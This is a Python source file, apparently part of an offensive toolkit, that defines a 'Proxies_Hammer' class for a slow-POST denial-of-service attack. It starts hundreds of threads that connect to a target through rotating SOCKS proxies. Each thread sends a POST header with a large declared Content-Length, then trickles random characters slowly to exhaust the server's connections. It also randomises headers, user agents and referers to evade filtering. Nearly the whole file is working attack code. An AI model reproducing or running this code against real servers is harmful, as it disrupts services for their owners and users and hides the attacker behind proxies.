from bane.ddos.utils import *

class Proxies_Hammer(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        cookie=None,
        user_agents=Common_Variables.user_agents_list,
        threads_daemon=True,
        scraping_timeout=15,
        max_content=15000,
        min_content=10000,
        threads=700,
        timeout=5,
        paths=['/'],
        http_proxies=None,
        socks4_proxies=None,
        socks5_proxies=None,
        duration=60,
        ssl_on=False,
        logs=True,
    ):
        self.proxies=Proxies_Interface.get_socket_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
        self.proxies=[x for x in self.proxies if x['proxy_type'] in ['socks4','socks5','s4','s5']]
        if self.proxies==[]:
            self.proxies=[{'proxy_host':None,'proxy_port':None,'proxy_username':None,'proxy_password':None,'proxy_type':None}]
        self.cookie = cookie
        self.user_agents = user_agents
        self.stop = False
        self.start = time.time()
        self.target = u
        self.paths=paths
        self.duration = duration
        self.port = p
        self.timeout = timeout
        self.max_content = max_content
        self.min_content = min_content
        self.logs = logs
        self.ssl_on=ssl_on
        self.counter = 0
        self.fails=0
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) >= self.duration
                ):  # this is a safety mechanism so the attack won't run forever
                    break
                if self.stop == True:
                    break
                try:
                    proxy=random.choice(self.proxies)
                    s=Proxies_Getter.get_proxy_socket(self.target,self.port,timeout=self.timeout,**proxy)
                    if self.port==443 or self.ssl_on==True:
                        s=Socket_Connection.wrap_socket_with_ssl(s,self.target)
                    q = random.randint(self.min_content, self.max_content)
                    ck = ""
                    if self.cookie:
                        ck = "Cookie: " + self.cookie + "\r\n"
                    s.send(
                        Socket_Connection.reorder_headers_randomly(
                            "POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(
                                random.choice(self.paths),
                                ck,
                                random.choice(self.user_agents),
                                random.randint(300, 1000),
                                q,
                                (
                                    random.choice(Common_Variables.referers_list)
                                    + random.choice(Common_Variables.source_string)
                                    + str(random.randint(0, 100000000))
                                    + random.choice(Common_Variables.source_string)
                                ),
                                self.target,
                            )
                        ).encode("utf-8")
                    )
                    for i in range(q):
                        if (
                            int(time.time() - self.start) >= self.duration
                        ):  # this is a safety mechanism so the attack won't run forever
                            break
                        if self.stop == True:
                            break
                        h = random.choice(Common_Variables.source_string)
                        try:
                            s.send(h.encode("utf-8"))
                            if self.logs == True:
                                sys.stdout.write("\rPosted: {} --> {}".format(h, proxy['proxy_host']))
                                sys.stdout.flush()
                            self.counter+=1
                                # print("Posted: {} --> {}".format(h,ipp))
                            time.sleep(random.uniform(0.1, 3))
                        except :
                            break
                    s.close()
                except:
                    self.fails+=1
                self.counter -= 1
                time.sleep(0.1)
            self.kill()
        except:
            pass
